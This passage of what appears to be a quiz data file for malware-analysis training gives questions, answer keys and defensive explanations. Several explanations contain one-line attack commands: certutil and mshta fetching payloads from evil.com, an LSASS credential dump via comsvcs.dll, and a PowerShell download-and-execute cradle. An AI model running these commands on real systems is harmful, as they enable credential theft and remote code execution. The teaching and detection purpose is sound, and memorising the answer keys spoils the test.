            explanation: '🔤 PowerShell Obfuscation: 0x70=p, 0x6f=o, 0x77=w, 0x65=e, 0x72=r → "power". IEX = Invoke-Expression (executes string as code). Other obfuscation: Base64 encoding (-enc), string reversal, character substitution, case randomization (pOwErShElL), backticks (po`wer`shell), AMSI bypass techniques. Detection: PowerShell logging (Module/Script Block logging), EventID 4104 (script block text), AMSI integration. Deobfuscation tools: PowerDecode, PSDecode, de4dot. Enable constrained language mode to limit obfuscation capabilities.'
        },
        {
            id: 'mal15',
            title: 'Living Off The Land Binaries',
            points: 8,
            question: 'Which Windows built-in tools are commonly abused by attackers (LOLBins)? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'certutil', text: 'certutil.exe' },
                { value: 'bitsadmin', text: 'bitsadmin.exe' },
                { value: 'mshta', text: 'mshta.exe' },
                { value: 'notepad', text: 'notepad.exe' },
                { value: 'calc', text: 'calc.exe' },
                { value: 'wusa', text: 'wusa.exe' }
            ],
            correct: ['certutil', 'bitsadmin', 'mshta', 'wusa'],
            explanation: '🛠️ LOLBins (Living Off The Land Binaries): Legitimate Windows binaries abused for malicious purposes. Examples: **certutil** -urlcache -split -f http://evil.com/malware.exe (download), **bitsadmin** /transfer (stealth download), **mshta** http://evil.com/payload.hta (execute remote script), **wusa** /extract (unpack files). Also: rundll32, regsvr32, msiexec, wmic, forfiles. Notepad/calc = not abused. Defense: Application whitelisting (deny execution from temp dirs), command-line logging, Sysmon configs. Resource: LOLBAS-project.github.io. MITRE T1218.'
        },
        {
            id: 'mal16',
            title: 'Sandbox Evasion',
            points: 9,
            question: 'Malware checks for: mouse movement, >2GB RAM, >2 CPU cores, running processes >30, and uptime >10min. Why?',
            type: 'radio',
            options: [
                { value: 'sandbox_evasion', text: 'Sandbox evasion' },
                { value: 'performance', text: 'Ensuring sufficient system resources for operation' },
                { value: 'target', text: 'Targeting only high-value enterprise systems' },
                { value: 'compatibility', text: 'Compatibility checking for different OS versions' },
                { value: 'damage', text: 'Maximizing damage to powerful systems' }
            ],
            correct: 'sandbox_evasion',
            explanation: '🎭 Sandbox Evasion Techniques: Sandboxes (Cuckoo, Joe Sandbox, ANY.RUN) typically have: minimal resources (save costs), no user interaction, few running processes, short analysis time (<5 min). Malware detects via: 1) **Environmental checks** (VM artifacts, low RAM/CPU), 2) **Timing delays** (sleep 10min exceeds analysis timeout), 3) **User interaction** (require mouse click), 4) **Process checks** (<50 processes = sandbox). Also checks: VM registry keys (VMware Tools), MAC addresses (00:0C:29 = VMware). Defense: Bare metal analysis, extend sandbox timeout, simulate user activity. Advanced: Time-bomb malware (activate on specific date).'
        },
        {
            id: 'mal17',
            title: 'Steganography in Malware',
            points: 8,
            question: 'JPG image file appears normal but contains 2MB of extra data after JPEG EOF marker (FFD9). What attack technique?',
            type: 'radio',
            options: [
                { value: 'stego', text: 'Steganography' },
                { value: 'polyglot', text: 'Polyglot file' },
                { value: 'corrupt', text: 'Corrupted file' },
                { value: 'metadata', text: 'Malicious EXIF metadata' },
                { value: 'format', text: 'Alternative JPEG format' }
            ],
            correct: 'stego',
            explanation: '🖼️ Steganography: Hide data within images/audio/video. JPEG structure: Header → Image Data → FFD9 (EOF marker). Data after FFD9 = ignored by image viewers but readable by malware. Types: 1) **Appended data** (easiest - concat file), 2) **LSB substitution** (least significant bit of pixels), 3) **Palette manipulation** (PNG), 4) **Whitespace encoding** (text files). Detection: File size anomaly, entropy analysis, strings command, binwalk (find embedded files). Examples: Stegoloader, Sunburst (SolarWinds), HAMMERTOSS. Defense: Strip metadata, file format validation, sandbox execution of extracted data.'
        },
        {
            id: 'mal18',
            title: 'Malware Communication Protocols',
            points: 7,
            question: 'C2 traffic analysis shows DNS TXT record queries returning base64 strings every 30 seconds. What technique?',
            type: 'radio',
            options: [
                { value: 'dns_tunnel', text: 'DNS tunneling' },
                { value: 'dga', text: 'Domain Generation Algorithm' },
                { value: 'fast_flux', text: 'Fast flux DNS' },
                { value: 'normal', text: 'Normal DNS queries' },
                { value: 'dnssec', text: 'DNSSEC validation queries' }
            ],
            correct: 'dns_tunnel',
            explanation: '🚇 DNS Tunneling: Exfiltrate data or C2 comms via DNS queries/responses. DNS = allowed on most firewalls. Techniques: 1) **TXT records** (can hold arbitrary data - malware queries malware.evil.com TXT → server responds with base64 command), 2) **Query names** (encode data in subdomain: ZXhmaWw.evil.com), 3) **NULL records**, 4) **CNAME chains**. Indicators: High volume DNS queries, long query names (>50 chars), TXT record queries to unusual domains, high entropy. Detection: DNS analytics (frequency, length), threat intel. Tools: iodine, dnscat2. Defense: Monitor DNS, blacklist known tunneling domains. MITRE T1071.004.'
        },
        {
            id: 'mal19',
            title: 'Ransomware Indicators of Compromise',
            points: 10,
            question: 'Which behaviors suggest early-stage ransomware activity? (Select ALL - early detection critical)',
            type: 'checkbox',
            options: [
                { value: 'vss_delete', text: 'Volume Shadow Copy deletion' },
                { value: 'backup_disable', text: 'Backup service disabled or stopped' },
                { value: 'mass_files', text: 'Rapid sequential file access across multiple directories' },
                { value: 'bcdedit', text: 'bcdedit /set {default} recoveryenabled no' },
                { value: 'browser', text: 'Browser history access' },
                { value: 'email', text: 'Reading email via IMAP' }
            ],
            correct: ['vss_delete', 'backup_disable', 'mass_files', 'bcdedit'],
            explanation: '🚨 Pre-Encryption Indicators: Modern ransomware disables recovery before encrypting. **Critical Early Warnings**: 1) **VSS deletion** - removes Windows restore points (prevents rollback), 2) **Backup tampering** - stops Windows Backup, Veeam, or deletes backup files, 3) **Mass file I/O** - unusual pattern (100s of files/sec across shares), 4) **bcdedit** - disables boot recovery. Time to detect = minutes before full encryption. Browser/email = normal activity. Detection: Sysmon, EDR behavioral rules, honeypot files (canary tokens). Response: Auto-isolate on VSS delete. Examples: Ryuk, REvil, LockBit. MITRE T1490 (Inhibit System Recovery).'
        },
        {
            id: 'mal20',
            title: 'Advanced Persistent Threat Tactics',
            points: 11,
            question: 'APT group maintains access for 18 months undetected using: stolen certificates, memory-only implants, legitimate tools (WMI/PsExec), low-frequency beaconing. Which category best describes this?',
            type: 'radio',
            options: [
                { value: 'apt', text: 'Advanced Persistent Threat' },
                { value: 'ransomware', text: 'Ransomware operation' },
                { value: 'script_kiddie', text: 'Script kiddie using public exploits' },
                { value: 'insider', text: 'Malicious insider threat' },
                { value: 'hacktivism', text: 'Hacktivist campaign' },
                { value: 'commodity', text: 'Commodity malware' }
            ],
            correct: 'apt',
            explanation: '🎯 APT Characteristics: **Advanced** = sophisticated techniques (zero-days, custom tools), **Persistent** = long-term access (months/years), **Threat** = skilled adversary (nation-state or organized crime). Tactics: 1) **Stealth** (living-off-the-land, memory-only), 2) **Persistence** (multiple backdoors, legitimate certs), 3) **Low-and-slow** (blend with normal traffic), 4) **Targeted** (specific organization/sector). vs Ransomware (loud, fast, financial), Script kiddie (unsophisticated, public tools), Commodity malware (automated, mass-spray). Examples: APT29 (Cozy Bear), APT28 (Fancy Bear), Lazarus Group. Defense: Threat hunting, behavioral analytics, assume breach mentality.'
        },
        {
            id: 'mal21',
            title: 'Process Injection - DLL Injection',
            points: 8,
            question: 'Malware injects malicious DLL into legitimate process (explorer.exe). Which Windows APIs are typically used? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'openprocess', text: 'OpenProcess' },
                { value: 'virtualallocex', text: 'VirtualAllocEx' },
                { value: 'writeprocessmemory', text: 'WriteProcessMemory' },
                { value: 'createremotethread', text: 'CreateRemoteThread' },
                { value: 'messagebox', text: 'MessageBox' },
                { value: 'getwindowtext', text: 'GetWindowText' }
            ],
            correct: ['openprocess', 'virtualallocex', 'writeprocessmemory', 'createremotethread'],
            explanation: '💉 DLL Injection (MITRE T1055.001): Classic process injection. Steps: 1) **OpenProcess** → get handle with PROCESS_ALL_ACCESS, 2) **VirtualAllocEx** → allocate memory in target, 3) **WriteProcessMemory** → write DLL path, 4) **CreateRemoteThread** → execute LoadLibrary to load DLL. Result: Malicious code runs in legitimate process (evades detection, inherits privileges). Detection: Monitor CreateRemoteThread, unusual DLL loads, Sysmon EventID 8 (CreateRemoteThread), EDR behavioral rules. Variants: Reflective DLL injection, process hollowing, thread hijacking. Defense: Enable Attack Surface Reduction (ASR) rules.'
        },
        {
            id: 'mal22',
            title: 'Credential Dumping Tools',
            points: 7,
            question: 'Which tools can extract credentials from LSASS memory? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'mimikatz', text: 'Mimikatz' },
                { value: 'procdump', text: 'ProcDump' },
                { value: 'comsvcs_dll', text: 'comsvcs.dll via rundll32' },
                { value: 'nmap', text: 'Nmap' },
                { value: 'wireshark', text: 'Wireshark' },
                { value: 'ping', text: 'ping.exe' }
            ],
            correct: ['mimikatz', 'procdump', 'comsvcs_dll'],
            explanation: '🔑 Credential Dumping (MITRE T1003.001): LSASS = Local Security Authority Subsystem Service (stores credentials in memory). Methods: 1) **Mimikatz** - direct memory read (sekurlsa module), 2) **ProcDump** - sysinternals tool creates .dmp file, 3) **comsvcs.dll** - rundll32.exe comsvcs.dll,MiniDump (built-in Windows DLL). Command: rundll32.exe comsvcs.dll,MiniDump <lsass_pid> dump.bin full. Defense: Credential Guard (virtualization-based security), Protected Process Light (PPL) for LSASS, EDR monitoring, restrict SeDebugPrivilege. Detection: Sysmon EventID 10 (process access), EventID 4656 (handle to LSASS).'
        },
        {
            id: 'mal23',
            title: 'Sandbox Evasion - Timing Checks',
            points: 8,
            question: 'Malware sample delays execution for 10 minutes before activating payload. What is the purpose?',
            type: 'radio',
            options: [
                { value: 'sandbox_evasion', text: 'Evade automated sandbox analysis' },
                { value: 'stealth', text: 'Avoid detection by security software' },
                { value: 'network', text: 'Wait for network connection' },
                { value: 'persistence', text: 'Ensure persistence mechanisms are established' },
                { value: 'random', text: 'Programming error' },
                { value: 'user_activity', text: 'Wait for user activity to appear legitimate' }
            ],
            correct: 'sandbox_evasion',
            explanation: '⏱️ Sandbox Evasion - Time Delays: Automated sandboxes analyze malware for limited time (2-5 minutes). **Sleep evasion**: Malware delays (Sleep(600000), GetTickCount checks, infinite loops). When time expires → sandbox reports "no malicious behavior". Other evasion: 1) **Environment checks** (VM detection, username!=admin, low CPU/RAM), 2) **User interaction** (wait for mouse clicks/keystrokes), 3) **Geofencing** (check IP location). Detection: Dynamic analysis with extended timeouts, accelerate sleep functions, behavioral monitoring beyond execution. Tools: Cuckoo Sandbox, ANY.RUN, Joe Sandbox. MITRE T1497 (Virtualization/Sandbox Evasion).'
        },
        {
            id: 'mal24',
            title: 'Fileless Malware Characteristics',
            points: 9,
            question: 'True fileless malware operates how?',
            type: 'radio',
            options: [
                { value: 'memory_only', text: 'Executes entirely in memory' },
                { value: 'encrypted_file', text: 'Encrypted executable file on disk' },
                { value: 'hidden_folder', text: 'Stored in hidden system folder' },
                { value: 'cloud', text: 'Hosted on cloud storage' },
                { value: 'temp_file', text: 'Writes to temp directory only' },
                { value: 'network_share', text: 'Runs from network share' }
            ],
            correct: 'memory_only',
            explanation: '👻 Fileless Malware: NO traditional file on disk (evades file-based AV). Execution: 1) **PowerShell/WScript in-memory** - IEX(New-Object Net.WebClient).DownloadString(), 2) **Registry persistence** - store payload in HKCU\Software\<key>, execute via regsvr32/rundll32, 3) **WMI event subscription** - permanent event filter executes script. Example: Kovter ransomware (registry-only), Poweliks. Detection: Memory scanning, PowerShell logging (ScriptBlock logging), command-line auditing, EDR behavioral analytics, Sysmon EventID 7 (image loaded). Defense: Constrained Language Mode (PowerShell), AMSI integration, Application Control (deny script execution from non-standard locations). MITRE T1027, T1059.'
        },
        {
            id: 'mal25',
            title: 'Malware C2 Communication Patterns',
            points: 7,
            question: 'Malware beacons to C2 server every 60 seconds with 256-byte packets. Which detection method is MOST effective?',
            type: 'radio',
            options: [
                { value: 'network_baseline', text: 'Network traffic baseline/anomaly detection' },
                { value: 'signature', text: 'Signature-based detection' },
                { value: 'antivirus', text: 'Endpoint antivirus scanning' },
                { value: 'firewall', text: 'Firewall rule blocking' },
                { value: 'ids', text: 'Traditional IDS signature matching' },
                { value: 'manual', text: 'Manual log review' }
            ],
            correct: 'network_baseline',
            explanation: '📡 C2 Beacon Detection: **Beaconing** = regular, predictable communication pattern (heartbeat). Detection methods: 1) **Network baseline** (statistical analysis, Jitter analysis - variance in beacon timing), 2) **Frequency analysis** (repeated connections to same IP), 3) **Packet size consistency** (256 bytes every 60s = highly suspicious). Tools: Darktrace, Vectra AI, Security Onion, Rita (Real Intelligence Threat Analytics). Signatures fail if malware is new/polymorphic. Beacon variants: HTTP GET requests, DNS queries, ICMP, NTP. Attacker countermeasure: Add jitter (random delay ±20s). MITRE T1071 (Application Layer Protocol), T1573 (Encrypted Channel).'
        },
        {
            id: 'mal26',
            title: 'Packer Detection',
            points: 6,
            question: 'PE file analysis shows: High entropy in .text section, few imports, small import table, large overlay. What does this suggest?',
            type: 'radio',
            options: [
                { value: 'packed', text: 'Packed/compressed malware' },
                { value: 'legitimate', text: 'Legitimate software' },
                { value: 'corrupted', text: 'Corrupted executable' },
                { value: 'driver', text: 'Device driver file' },
                { value: 'script', text: 'Script file' },
                { value: 'library', text: 'Static library file' }
            ],
            correct: 'packed',
            explanation: '📦 Packer Indicators: **Packing** = compress/encrypt code to evade analysis. Signs: 1) **High entropy** (7.0+/8.0 = encrypted/compressed), 2) **Few imports** (kernel32.dll LoadLibrary/GetProcAddress only - resolve APIs at runtime), 3) **Small import table** vs large file, 4) **Abnormal section names** (.UPX, .ASPack, .themida), 5) **Large overlay** (data after last section). Packers: UPX, ASPack, Themida, VMProtect. Analysis: Static (PE parsers - PEStudio, pestudio, DIE), Dynamic (unpack in memory - x64dbg, OllyDbg, dump unpacked code). Detection: YARA rules for packer signatures, entropy analysis. Unpacking tools: UPXUnpacker, generic unpacker scripts.'
        },
        {
            id: 'mal27',
            title: 'Ransomware File Extension Patterns',
            points: 5,
            question: 'Files encrypted with extensions: .locked, .encrypted, .l0cked, .r4ns0mw4r3. Which ransomware family is indicated?',
            type: 'radio',
            options: [
                { value: 'generic', text: 'Generic/unknown ransomware' },
                { value: 'wannacry', text: 'WannaCry' },
                { value: 'locky', text: 'Locky' },
                { value: 'cerber', text: 'Cerber' },
                { value: 'cryptolocker', text: 'CryptoLocker' },
                { value: 'ryuk', text: 'Ryuk' }
            ],
            correct: 'generic',
            explanation: '🔐 Ransomware File Extensions: Each family uses unique extensions. Examples: **WannaCry** (.WNCRY), **Locky** (.locky/.odin/.thor), **Cerber** (.cerber), **Ryuk** (.RYK), **Conti** (.CONTI), **REvil** (random), **LockBit** (.lockbit). Non-specific extensions (.locked, .encrypted) = generic/new variant. Identification: 1) Extension, 2) Ransom note filename (README.txt, HOW_TO_DECRYPT.html), 3) Wallpaper change, 4) Contact email/TOR URL. Resources: ID Ransomware (online identification), No More Ransom Project (free decryption tools). Never pay ransom (funds criminals, no guarantee). Response: Isolate, identify variant, check for decryptor, restore from backup.'
        },
        {
            id: 'mal28',
            title: 'Trojan vs Worm vs Virus',
            points: 6,
            question: 'What is the key difference between a worm and a virus?',
            type: 'radio',
            options: [
                { value: 'self_replicate', text: 'Worm self-replicates across network without host file; virus needs host file' },
                { value: 'damage', text: 'Worm causes more damage than virus' },
                { value: 'speed', text: 'Worm spreads faster than virus' },
                { value: 'detection', text: 'Worm is easier to detect than virus' },
                { value: 'payload', text: 'Worm has malicious payload; virus does not' },
                { value: 'platform', text: 'Worm targets Unix; virus targets Windows' }
            ],
            correct: 'self_replicate',
            explanation: '🦠 Malware Categories: **Virus** = infects host files (attaches to .exe/.doc), requires user action to execute host, spreads via file sharing. **Worm** = standalone program, self-replicates across network automatically (exploits vulnerabilities), no user action needed. **Trojan** = disguised as legitimate software, no self-replication. Examples: Virus (ILOVEYOU - VBS script), Worm (Conficker - SMB exploit, WannaCry), Trojan (Emotet, Zeus). Worms spread faster (automated), cause network congestion (scanning, exploitation traffic). Detection: Network behavior (rapid connections), file system monitoring, process analysis. Defense: Patching (prevent exploitation), network segmentation.'
        },
        {
            id: 'mal29',
            title: 'Backdoor Detection - Network Indicators',
            points: 8,
            question: 'Backdoor maintains persistent access. Which network indicators suggest backdoor activity? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'outbound_periodic', text: 'Periodic outbound connections to unknown external IP' },
                { value: 'listening_port', text: 'Unusual listening port' },
                { value: 'dns_tunneling', text: 'DNS queries with long subdomain names' },
                { value: 'reverse_shell', text: 'Reverse shell connection' },
                { value: 'http_normal', text: 'Normal HTTP traffic to legitimate websites' },
                { value: 'email', text: 'Standard SMTP/IMAP email traffic' }
            ],
            correct: ['outbound_periodic', 'listening_port', 'dns_tunneling', 'reverse_shell'],
            explanation: '🚪 Backdoor Network Indicators: Backdoors = unauthorized remote access mechanisms. Network signs: 1) **Beaconing** - regular C2 communication (60s, 5min intervals), 2) **Unusual ports** - 31337 (leet), 4444 (Metasploit default), 12345 (NetBus), 3) **DNS tunneling** - subdomain encodes data (aGVsbG8ud29ybGQ=.evil.com), 4) **Reverse shell** - bypass firewall (internal→external connection). Common backdoors: Netcat, Meterpreter, Cobalt Strike Beacon, China Chopper, webshells. Detection: Network baseline anomaly detection, DNS query analysis, NetFlow analysis, threat intel feeds. Defense: Egress filtering, DNS monitoring, application whitelisting. MITRE T1071, T1095, T1572.'
        },
        {
            id: 'mal30',
            title: 'Rootkit Types',
            points: 9,
            question: 'Rootkit operates at Ring 0 (kernel mode), can hide processes/files/registry keys from all user-mode tools. What type of rootkit?',
            type: 'radio',
            options: [
                { value: 'kernel', text: 'Kernel-mode rootkit' },
                { value: 'user', text: 'User-mode rootkit' },
                { value: 'bootkit', text: 'Bootkit' },
                { value: 'firmware', text: 'Firmware rootkit' },
                { value: 'application', text: 'Application-level rootkit' },
                { value: 'hypervisor', text: 'Hypervisor rootkit' }
            ],
            correct: 'kernel',
            explanation: '👻 Rootkit Levels: **Ring 0 = Kernel Mode** (highest privilege, full hardware access). Types: 1) **User-mode** (Ring 3) - hooks API functions, easiest to detect/remove, 2) **Kernel-mode** (Ring 0) - kernel driver (.sys), hooks SSDT/IRP, hides processes (DKOM - Direct Kernel Object Manipulation), very stealthy, 3) **Bootkit** (MBR/VBR) - loads before OS, persistent, 4) **Hypervisor** (Ring -1) - VM-based rootkit (Blue Pill), below kernel. Examples: TDL4 (bootkit), Alureon, ZeroAccess. Detection: Kernel memory analysis (Volatility, Rekall), GMER, bootkit scanners, Secure Boot. Defense: Driver signing enforcement, UEFI Secure Boot, Trusted Boot, virtualization-based security. MITRE T1014, T1542.'
        },
        {
            id: 'mal31',
            title: 'Macro Malware Analysis',
            points: 7,
            question: 'Excel file contains macro with: Auto_Open(), Shell("powershell -w hidden -enc <base64>"). What is the malware behavior?',
            type: 'radio',
            options: [
                { value: 'dropper', text: 'Macro dropper' },
                { value: 'ransomware', text: 'Direct ransomware encryption' },
                { value: 'keylogger', text: 'Keylogger installation' },
                { value: 'benign', text: 'Benign automation script' },
                { value: 'adware', text: 'Adware popup' },
                { value: 'wiper', text: 'Data wiping malware' }
            ],
            correct: 'dropper',
            explanation: '📄 Macro Malware (MITRE T1566.001): Office docs with malicious VBA macros. Flow: 1) **Auto_Open()** - executes when doc opens, 2) **Shell()** - runs system command, 3) **PowerShell -w hidden** (hide window) **-enc** (base64 encoded command) - decode: [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String()). Typical payload: Download Stage-2 (Emotet, Trickbot, Qbot). Variants: Auto_Close(), Document_Open(), Workbook_Open(). Analysis: oledump.py (extract VBA), olevba (detect malicious), CyberChef (decode base64). Defense: Disable macros (Trust Center), ASR rule (block Office child processes), Protected View. 45% of malware uses Office docs (Verizon DBIR).'
        },
        {
            id: 'mal32',
            title: 'Memory Forensics - Volatility',
            points: 8,
            question: 'Analyzing memory dump with Volatility. Which plugin identifies hidden processes?',
            type: 'radio',
            options: [
                { value: 'psxview', text: 'psxview' },
                { value: 'pslist', text: 'pslist' },
                { value: 'filescan', text: 'filescan' },
                { value: 'netscan', text: 'netscan' },
                { value: 'malfind', text: 'malfind' },
                { value: 'imageinfo', text: 'imageinfo' }
            ],
            correct: 'psxview',
            explanation: '🔬 Volatility Memory Forensics: **psxview** = cross-view process detection (compares PsActiveProcessHead, EPROCESS pool scanning, PspCidTable, Csrss handles, sessions, desktop threads). Rootkits hide from some methods but not all → psxview reveals discrepancies. Other plugins: **pslist** (standard active processes), **pstree** (parent-child), **psscan** (includes terminated/hidden), **malfind** (injected/hollowed processes), **ldrmodules** (DLL hiding), **netscan** (network connections). Workflow: imageinfo → pslist/psxview → malfind → procdump → dlldump. Tools: Volatility 2/3, Rekall. DFIR technique for advanced malware analysis. MITRE T1014 (Rootkit), T1055 (Process Injection).'
        },
        {
            id: 'mal33',
            title: 'Code Signing Certificate Abuse',
            points: 8,
            question: 'Malware is signed with stolen/compromised Authenticode certificate. What is the impact?',
            type: 'radio',
            options: [
                { value: 'bypass_security', text: 'Bypasses security controls' },
                { value: 'no_impact', text: 'No impact' },
                { value: 'encryption', text: 'Encrypts the malware payload' },
                { value: 'obfuscation', text: 'Obfuscates malware code' },
                { value: 'av_detection', text: 'Increases antivirus detection' },
                { value: 'performance', text: 'Improves malware performance' }
            ],
            correct: 'bypass_security',
            explanation: '📜 Code Signing Abuse (MITRE T1553.002): Valid digital signature = trusted by Windows. Attacker methods: 1) **Steal certificate** (compromise software vendor), 2) **Forge certificate** (CA breach), 3) **Sign before cert revoked**. Impact: Bypass SmartScreen Filter, Windows Defender Application Control (WDAC), AppLocker whitelisting, driver signing enforcement (kernel drivers). Examples: Stuxnet (stolen RealTek/JMicron certs), Flame (forged Microsoft cert), SolarWinds (compromised build system). Defense: Certificate revocation checks (CRL/OCSP), cert pinning, monitor certificate transparency logs, code integrity policies. Verify: sigcheck.exe -tv (Sysinternals), Get-AuthenticodeSignature (PowerShell).'
        },
        {
            id: 'mal34',
            title: 'Anti-Analysis - VM Detection',
            points: 7,
            question: 'Malware checks for VM artifacts. Which indicates VirtualBox? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'vbox_dll', text: 'VBoxGuest.sys driver or VBoxService.exe process' },
                { value: 'vbox_registry', text: 'Registry key: HKLM\\HARDWARE\\ACPI\\DSDT\\VBOX__' },
                { value: 'vbox_mac', text: 'MAC address prefix: 08:00:27:xx:xx:xx' },
                { value: 'vmware_dll', text: 'vmware.dll or vmtoolsd.exe' },
                { value: 'normal_user', text: 'Username: "User" or "Admin"' },
                { value: 'normal_cpu', text: 'CPU core count check' }
            ],
            correct: ['vbox_dll', 'vbox_registry', 'vbox_mac'],
            explanation: '🖥️ VM Detection (MITRE T1497.001): Malware avoids analysis in VMs. **VirtualBox artifacts**: 1) Files/Processes: VBoxGuest.sys, VBoxService.exe, VBoxTray.exe, 2) **Registry**: HKLM\\HARDWARE\\ACPI\\DSDT\\VBOX__, HKLM\\HARDWARE\\Description\\System (SystemBiosVersion="VBOX"), 3) **MAC prefix**: 08:00:27 (Oracle), 4) **Device names**: VirtualBox Graphics Adapter. VMware uses different artifacts (vmware.dll, 00:0C:29 MAC). Bypass: Pafish (detect VM artifacts), hide VM indicators (rename processes, change MAC, edit registry). Defense: Bare metal analysis, nested virtualization detection bypass, cuckoo-modified sandboxes. Tools: al-khaser (anti-analysis checks).'
        },
        {
            id: 'mal35',
            title: 'DGA - Domain Generation Algorithm',
            points: 9,
            question: 'Malware generates random domains: xjk23hsd.com, pqm19wke.net, zlw48vnm.org (changes daily). What is the purpose?',
            type: 'radio',
            options: [
                { value: 'dga_c2', text: 'DGA for C2 resilience' },
                { value: 'phishing', text: 'Phishing campaign using random domains' },
                { value: 'dns_tunneling', text: 'DNS tunneling for data exfiltration' },
                { value: 'cdn', text: 'CDN load balancing' },
                { value: 'ddos', text: 'DDoS attack coordination' },
                { value: 'spam', text: 'Spam email distribution' }
            ],
            correct: 'dga_c2',
            explanation: '🎲 DGA - Domain Generation Algorithm (MITRE T1568.002): Malware+C2 server both run DGA (generate same domains using seed: date, hardcoded value). Attacker pre-registers few domains from daily list → malware tries thousands until connection succeeds. Advantage: Resilient to takedowns (can\'t block all possible domains). Examples: Conficker (50k domains/day), Cryptolocker, Necurs. Characteristics: Random-looking domains (high entropy), short lifespan, .com/.net/.org. Detection: DNS query analysis (NXDOMAIN rate, entropy scoring), ML models (DGArchive dataset), Alexa top-1M comparison. Defense: DNS RPZ (response policy zones), threat intel feeds, sinkholing. Tools: dgarchive.caad.fkie.fraunhofer.de.'
        },
        {
            id: 'mal36',
            title: 'PowerShell Empire Detection',
            points: 8,
            question: 'Post-exploitation framework "PowerShell Empire" uses which persistence technique by default?',
            type: 'radio',
            options: [
                { value: 'wmi_subscription', text: 'WMI Event Subscription' },
                { value: 'registry_run', text: 'Registry Run key' },
                { value: 'scheduled_task', text: 'Scheduled Task' },
                { value: 'service', text: 'Windows Service' },
                { value: 'startup', text: 'Startup folder' },
                { value: 'dll_hijacking', text: 'DLL hijacking' }
            ],
            correct: 'wmi_subscription',
            explanation: '👑 PowerShell Empire: Post-exploitation framework (C2, lateral movement, privilege escalation). Default persistence: **WMI Event Subscription** (MITRE T1546.003) - permanent event filter + consumer executes PowerShell payload on trigger (user logon, time interval). Advantages: Fileless (WMI database stores payload), stealthy (no registry run keys), survives reboots. Detection: Query WMI: Get-WMIObject -Namespace root\\subscription -Class __EventFilter, CommandLineEventConsumer. Empire modules: Invoke-Mimikatz, Invoke-PsExec, Invoke-TokenManipulation. Defense: PowerShell ScriptBlock logging, constrained language mode, WMI activity monitoring (EventID 5861 - new permanent WMI event). Alternative C2: Cobalt Strike, Covenant, Metasploit.'
        },
        {
            id: 'mal37',
            title: 'Malicious Browser Extension',
            points: 7,
            question: 'Browser extension requests permissions: "Read and change all your data on the websites you visit", "Manage your downloads". What are the risks? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'credential_theft', text: 'Steal credentials from login forms' },
                { value: 'session_hijack', text: 'Hijack session cookies' },
                { value: 'inject_malware', text: 'Inject malicious scripts or download malware' },
                { value: 'keylogging', text: 'Keylogging on web pages' },
                { value: 'safe', text: 'Safe' },
                { value: 'faster_browsing', text: 'Makes browsing faster' }
            ],
            correct: ['credential_theft', 'session_hijack', 'inject_malware', 'keylogging'],
            explanation: '🔌 Malicious Extensions (MITRE T1176): Browser extension = full access to web content. Permissions risks: 1) **"Read and change all data"** = access to all typed text (passwords, credit cards), modify page content (inject ads/phishing), steal cookies (session hijacking), 2) **"Manage downloads"** = silently download malware. Real examples: Shitcoin Wallet (crypto theft), DataSpii (harvesting browsing data), Great Suspender (adware). Detection: Review installed extensions (chrome://extensions), check permissions, research reputation (review count/ratings). Defense: Install from official stores only, principle of least privilege (deny unnecessary permissions), periodic extension audits, browser security policies (ExtensionInstallBlacklist GPO).'
        },
        {
            id: 'mal38',
            title: 'Malware Static Analysis Tools',
            points: 6,
            question: 'Which tools are used for static malware analysis (without execution)? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'pestudio', text: 'PEStudio' },
                { value: 'ida_pro', text: 'IDA Pro' },
                { value: 'strings', text: 'Strings.exe' },
                { value: 'ghidra', text: 'Ghidra' },
                { value: 'wireshark', text: 'Wireshark (network packet analysis' },
                { value: 'procmon', text: 'Process Monitor (runtime behavior' }
            ],
            correct: ['pestudio', 'ida_pro', 'strings', 'ghidra'],
            explanation: '🔍 Static vs Dynamic Analysis: **Static** = analyze without running (safe, fast, limited insight). **Dynamic** = execute in sandbox (dangerous, full behavior, resource-intensive). Static tools: 1) **PEStudio** - imports, exports, resources, entropy, VirusTotal check, 2) **IDA Pro/Ghidra** - disassemble to assembly/pseudo-C, 3) **Strings** - extract hardcoded IPs/URLs/keys, 4) **FLOSS** - obfuscated string extraction, 5) **pestudio/DIE** - packer detection, 6) **CFF Explorer** - PE headers. Dynamic tools: Wireshark (network), Procmon (file/registry), Regshot (registry diff), API Monitor. Workflow: Static first (quick triage) → Dynamic (detailed behavior) → Reverse engineering (deep dive). SANS FOR610 course.'
        },
        {
            id: 'mal39',
            title: 'Malware Analysis Sandbox Safety',
            points: 8,
            question: 'When analyzing malware in sandbox, which safety measures are CRITICAL? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'isolated_network', text: 'Isolated network' },
                { value: 'snapshot', text: 'VM snapshot before execution' },
                { value: 'disable_network', text: 'Network simulation' },
                { value: 'offline', text: 'Completely offline analysis' },
                { value: 'antivirus', text: 'Install antivirus in sandbox' },
                { value: 'admin_account', text: 'Use real admin credentials' }
            ],
            correct: ['isolated_network', 'snapshot', 'disable_network'],
            explanation: '⚠️ Sandbox Safety (CRITICAL): Malware in sandbox can escape, pivot, or communicate with C2. Safety measures: 1) **Network isolation** - VLAN/air-gapped network, no route to production, 2) **VM snapshots** - revert to clean state after each run, 3) **Network simulation** - INetSim/FakeNet-NG (fake DNS/HTTP responses), analyze C2 without real connection, 4) **No production credentials** - use fake/test accounts only. DO NOT: Use real internet (enables ransomware spread, DDoS participation, C2 communication), install AV (may interfere with analysis), use production credentials (lateral movement risk). Tools: Cuckoo Sandbox, REMnux, FLARE VM. Advanced: VM escape mitigations (hypervisor hardening), nested virtualization.'
        },
        {
            id: 'mal40',
            title: 'Indicators of Compromise (IOC) Types',
            points: 7,
            question: 'Which are Tier-1 analyzable IOCs? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'ip_address', text: 'IP address' },
                { value: 'domain', text: 'Domain name' },
                { value: 'file_hash', text: 'File hash' },
                { value: 'file_name', text: 'Filename' },
                { value: 'registry_key', text: 'Registry key' },
                { value: 'yara_rule', text: 'YARA rule (complex pattern matching' }
            ],
            correct: ['ip_address', 'domain', 'file_hash', 'file_name', 'registry_key'],
